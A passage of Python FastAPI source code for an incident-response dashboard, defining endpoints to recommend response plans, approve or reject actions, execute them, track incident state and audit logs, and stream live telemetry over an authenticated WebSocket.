    actor: str | None = None
    reason: str = ""


@app.post("/api/ir/recommend/{incident_id}")
def ir_recommend(incident_id: str, principal: Principal = Depends(require_analyst)):
    incident = correlation_engine.get_incident(incident_id)
    service = get_response_service()
    if incident is None:
        stored = service.repository.get(incident_id)
        if stored and stored["plans"]:
            return {"plan": next(iter(stored["plans"].values())), "approval_requests": service.list_approvals(incident_id)}
        raise HTTPException(404, "Incident not found")
    return service.add_plan(ir_recommender.recommend(incident), principal.username, incident.model_dump(mode="json"))


@app.get("/api/ir/incidents/{incident_id}/workflow")
def ir_incident_workflow(incident_id: str):
    service = get_response_service()
    workflow = service.workflow(incident_id)
    if workflow is not None:
        return workflow
    if correlation_engine.get_incident(incident_id) is None:
        raise HTTPException(404, "Incident not found")
    return {"incident_id": incident_id, "execution_mode": service.mode,
            "execution_notice": "Configured response backends are simulated; no real system is contained." if service.mode == "simulation" else "Approved IP-block actions use the configured firewall adapter. Unsupported actions are not simulated.",
            "storage_mode": service.repository.mode, "state": None, "allowed_transitions": [], "actions": []}


@app.get("/api/ir/approvals")
def ir_list_approvals(incident_id: Optional[str] = Query(default=None), status: Optional[ApprovalStatus] = Query(default=None)):
    requests = get_response_service().list_approvals(incident_id, status.value if status else None)
    return {"approvals": requests, "count": len(requests)}


@app.post("/api/ir/approvals/{request_id}/approve")
def ir_approve_request(request_id: str, body: IRApprovalDecisionRequest, principal: Principal = Depends(require_analyst)):
    return get_response_service().decide(request_id, True, bind_actor(body.analyst_id, principal), body.reason)


@app.post("/api/ir/approvals/{request_id}/reject")
def ir_reject_request(request_id: str, body: IRApprovalDecisionRequest, principal: Principal = Depends(require_analyst)):
    return get_response_service().decide(request_id, False, bind_actor(body.analyst_id, principal), body.reason)


@app.post("/api/ir/execute/{action_id}")
def ir_execute_action(action_id: str, principal: Principal = Depends(require_analyst)):
    return get_response_service().execute(action_id, principal.username)


@app.get("/api/ir/incidents/{incident_id}/state")
def ir_get_incident_state(incident_id: str):
    record = get_response_service().repository.get(incident_id)
    if not record or record["state"] is None:
        raise HTTPException(404, "Incident has no response plan")
    return record["state"]


@app.get("/api/ir/incidents/{incident_id}/audit")
def ir_get_incident_audit(incident_id: str):
    service = get_response_service()
    if service.repository.get(incident_id) is None:
        raise HTTPException(404, "Incident has no response plan")
    return {"entries": service.repository.audit(incident_id)}


@app.post("/api/ir/incidents/{incident_id}/transition")
def ir_transition_incident_state(incident_id: str, body: IRStateTransitionRequest, principal: Principal = Depends(require_analyst)):
    return get_response_service().transition(incident_id, body.to_phase, bind_actor(body.actor, principal), body.reason)


@app.get("/api/ir/stats")
def ir_stats():
    return get_response_service().stats()


# ---------------------------------------------------------------------------
# WebSocket Endpoint — Live Telemetry & Incident Stream
# ---------------------------------------------------------------------------


@app.websocket("/api/events/live")
async def websocket_events(ws: WebSocket):
    """Stream live telemetry, alerts, and incident updates to the dashboard."""
    await manager.connect(ws)
    try:
        while True:
            # Keep connection open
            try:
                await asyncio.wait_for(ws.receive_text(), timeout=15)
            except asyncio.TimeoutError:
                pass
            await asyncio.to_thread(get_auth_service().authenticate, ws.cookies.get(COOKIE_NAME, ""), False)
    except WebSocketDisconnect:
        pass
    except (AuthError, AuthStoreUnavailable):
        await ws.close(code=1008)
    finally:
        manager.disconnect(ws)
